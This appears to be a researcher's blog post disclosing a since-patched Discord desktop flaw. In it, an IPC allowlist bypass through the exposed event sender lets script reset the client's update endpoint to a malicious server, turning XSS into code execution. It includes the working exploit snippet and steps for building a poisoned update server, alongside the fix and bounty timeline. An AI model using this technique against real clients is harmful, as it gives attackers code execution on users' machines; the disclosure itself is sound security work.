---
title: "Discord 0-click XSS to RCE (2022)"
description: "IPC allowlist bypass allowing to arbitary IPC calls setting a malicious update endpoint"
date: 2022-10-07
draft: false
---

## Discord's IPC Allowlist

Discord expose a wrapped version of `ipcRenderer` for security, see [my 1-click Discord XSS to RCE](/discord-1click-xss-to-rce) for more details on Electron's IPC. It's implemented with a [Set](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set):

```js
const discordPrefixRegex = /^DISCORD_/;
function getDiscordIPCEvent(ev) {
  return discordPrefixRegex.test(ev) ? ev : `DISCORD_${ev}`;
}

const RENDERER_IPC_SEND_WHITELIST = new Set([ /* ... */ ]);
function send(ev, ...args) {
  const prefixedEvent = getDiscordIPCEvent(ev);

  if (!RENDERER_IPC_SEND_WHITELIST.has(prefixedEvent)) {
    throw new Error('cannot send this event');
  }

  ipcRenderer.send(prefixedEvent, ...args);
}
```

This restricts the IPC calls we can make heavily, so it becomes not very useful to us.


## Bypassing Discord's IPC Protections

With Electron's `on` handler for IPC it includes the `sender` of the event, with Discord's wrapper the original event is unmodified and passed through:

```js
function on(ev, callback) {
  ipcRenderer.on(getDiscordIPCEvent(ev), callback);
}
```

The `sender` allows use to bypass Discord's protections and use IPC arbitrarily with `event.sender.on`, `event.sender.invoke`, etc. So now we have arbitary IPC, how can we get to Node execution?


## Discord Settings

Discord has a settings file, `settings.json`, which contain several options as key/value pairs in an object. One of these options is setting the update endpoint to update Discord's client from (`NEW_UPDATE_ENDPOINT` on Windows, `UPDATE_ENDPOINT` on Linux/Mac). I have previously made [open source recreations of Discord's update server(s)](https://github.com/Goose-Nest/GooseUpdate).

Normally, Discord's IPC protections (allowlist) prevents us from modifying it, but with our bypass we can freely do it with `DISCORD_SETTINGS_SET`.


## Creating a Malicious Update Server

Discord's update server is quite complex and general so I won't go into details in this post. It uses native modules which I also explained in [my 1-click Discord XSS to RCE](/discord-1click-xss-to-rce). I made a script which compiles a server by:
1. Get the payload and add it into the `discord_desktop_core`
2. Recompute the hash for the module and bundle it into the expected format for the client
3. Download the official update manifest
4. Modify it so desktop core's version is increased causing it to update, and the hash matches the new one with our payload injected
5. Point desktop core's download to our server and leave the rest to the official server
6. Start a HTTP server on localhost with our modified manifest and desktop core


## Injecting Our Malicious Update Server

Since we now have our malicious update server and a way to add it to the user's settings, we can make our exploit:
1. Bypass Discord's IPC protections to achieve arbitary IPC
2. Set a malicious update endpoint for the client to use
3. Restart so the client is forced to update (Discord's client updates on every start)
4. Our payload is executed

Which looks like:

```js
DiscordNative.ipc.on('DISCORD_UPDATER_HISTORY_RESPONSE', function ({ sender }) { // Listen to event
  sender.invoke('DISCORD_SETTINGS_SET', 'NEW_UPDATE_ENDPOINT', 'http://localhost:9999/'); // Set our custom malicious update server to be used
  DiscordNative.app.relaunch(); // Relaunch to force update now
});

DiscordNative.ipc.send('DISCORD_UPDATER_HISTORY_QUERY_AND_TRUNCATE'); // Trigger event so our listener is called
```

## The Fix

The fixed code makes sure the event isn't included in the callback (taken directly from the original code):

```js
function on(ev, callback) {
  ipcRenderer.on(getDiscordIPCEvent(ev), function () {
    // Sender is dangerous, do not expose.
    callback.apply(callback, [null, ...[...arguments].slice(1)]);
  });
}
```


## Report Timeline

- 26th July 2022: Reported to Discord via HackerOne
- 27th July 2022: Confirmation of a high-severity issue
- 16th August 2022: Fixed in Canary
- 19th August 2022: Fixed in Stable
- 2nd September 2022: Confirmation of fix from Discord
- 2nd September 2022: $1500 bounty from Discord